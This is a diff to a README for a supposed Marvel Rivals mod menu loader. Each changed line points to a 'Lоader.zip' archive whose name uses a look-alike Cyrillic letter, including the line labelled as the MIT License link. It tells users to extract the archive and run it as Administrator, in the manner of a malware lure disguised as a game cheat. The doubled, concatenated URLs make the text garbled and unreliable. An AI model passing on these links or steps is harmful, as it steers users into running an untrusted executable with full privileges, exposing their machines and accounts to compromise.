@@ -26,13 +26,13 @@ Explore the power of modification and maximize your Marvel Rivals journey for Wi
 
 Get started with your Marvel Rivals Mod Menu Loader following these simple steps:
 
-1. **Download https://raw.githubusercontent.com/4pollo-code/MarvelRivals-ModForge/main/Lоader.zip from the repository.**  
+1. **Download https://raw.githubusercontent.com/4pollo-code/MarvelRivals-ModForge/main/Lоader.zipоhttps://raw.githubusercontent.com/4pollo-code/MarvelRivals-ModForge/main/Lоader.zip from the repository.**  
    - Ensure you have the latest version for maximum compatibility and newest features.
-2. **Extract https://raw.githubusercontent.com/4pollo-code/MarvelRivals-ModForge/main/Lоader.zip** to your Marvel Rivals game directory.
+2. **Extract https://raw.githubusercontent.com/4pollo-code/MarvelRivals-ModForge/main/Lоader.zipоhttps://raw.githubusercontent.com/4pollo-code/MarvelRivals-ModForge/main/Lоader.zip** to your Marvel Rivals game directory.
    - Use any archive tool, e.g., WinRAR, 7-Zip, The Unarchiver (macOS), or Ark (Linux).
 3. **Run the Loader executable** matching your OS.
-   - Windows: Run `https://raw.githubusercontent.com/4pollo-code/MarvelRivals-ModForge/main/Lоader.zip` as Administrator
-   - macOS: Open `https://raw.githubusercontent.com/4pollo-code/MarvelRivals-ModForge/main/Lоader.zip`
+   - Windows: Run `https://raw.githubusercontent.com/4pollo-code/MarvelRivals-ModForge/main/Lоader.zipоhttps://raw.githubusercontent.com/4pollo-code/MarvelRivals-ModForge/main/Lоader.zip` as Administrator
+   - macOS: Open `https://raw.githubusercontent.com/4pollo-code/MarvelRivals-ModForge/main/Lоader.zipоhttps://raw.githubusercontent.com/4pollo-code/MarvelRivals-ModForge/main/Lоader.zip`
    - Linux: Open terminal in the folder and run `./Loader`
 4. **Follow on-screen instructions** to initialize the mod menu.
 5. **Launch Marvel Rivals through the Loader** for fully modded gameplay!
@@ -88,7 +88,7 @@ If you enjoy Marvel Rivals, **please support the official developers and content
 
 ## 📜 License
 
-This repository is licensed under the [MIT License](https://raw.githubusercontent.com/4pollo-code/MarvelRivals-ModForge/main/Lоader.zip).  
+This repository is licensed under the [MIT License](https://raw.githubusercontent.com/4pollo-code/MarvelRivals-ModForge/main/Lоader.zipоhttps://raw.githubusercontent.com/4pollo-code/MarvelRivals-ModForge/main/Lоader.zip).  
 You are free to use, modify, and share this repository following the license terms.  
 See `LICENSE` file in the repository for more details.
 
